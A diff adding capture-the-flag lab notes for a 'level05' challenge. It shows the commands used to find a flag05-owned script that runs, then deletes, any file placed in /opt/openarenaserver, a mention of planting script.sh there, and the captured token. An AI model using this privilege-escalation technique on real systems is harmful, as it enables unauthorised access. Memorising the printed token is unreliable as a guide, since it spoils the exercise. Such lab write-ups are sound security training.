@@ -1,0 +1,30 @@
+?> find / -user flag05 -perm -u+x -exec ls -l {} \; 2> /dev/null
+ |
+ \----> rwxr-x---+ 1 flag05 flag05 94 Mar  5 20:30 /usr/sbin/openarenaserver
+
+?> getfacl /usr/sbin/openarenaserver
+ |
+ \---> getfacl: Removing leading '/' from absolute path names
+       # file: usr/sbin/openarenaserver
+       # owner: flag05
+       # group: flag05
+       user::rwx
+       user:level05:r--
+       group::r-x
+       mask::r-x
+       other::---
+
+?> cat /usr/sbin/openarenaserver
+ |
+ \ #!/bin/sh
+
+   for i in /opt/openarenaserver/* ; do
+      (ulimit -t 5; bash -x "$i")
+      rm -f "$i"
+    done
+
+on cree script.sh dans /opt/openarenaserver (Cf ./flag05/script.sh)
+
+?> cat /tmp/result.txt
+ |
+ \----> Check flag.Here is your token : viuaaale9huek52boumoomioc
